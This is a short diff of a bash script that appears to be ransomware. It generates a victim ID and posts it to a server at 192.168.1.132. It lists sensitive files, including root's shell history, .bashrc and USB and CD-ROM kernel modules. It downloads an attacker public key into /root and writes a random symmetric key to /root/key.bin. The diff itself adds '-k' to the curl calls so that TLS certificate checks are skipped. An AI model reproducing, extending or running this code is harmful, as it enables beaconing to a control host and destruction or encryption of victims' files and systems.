@@ -2,7 +2,7 @@
 
 genKey=$(cat /dev/urandom | tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)
 
-curl -d "uniqueID=${genKey}" https://192.168.1.132/target.php &>/dev/null
+curl -k -d "uniqueID=${genKey}" https://192.168.1.132/target.php &>/dev/null
 
 if [ -f /etc/redhat-release ]
 then
@@ -60,7 +60,7 @@ fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
           "/lib/modules/$(uname -r)/kernel/drivers/usb/usb-storage.ko" \
           "/lib/modules/$(uname -r)/kernel/drivers/cdrom/cdrom.ko" )
 
-curl https://192.168.1.132/pub.pem > /root/pub.pem 
+curl -k https://192.168.1.132/downloads/pub.pem > /root/pub.pem 
 chmod 755 /root/pub.pem
 
 cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 256 | head -n 1 > /root/key.bin 
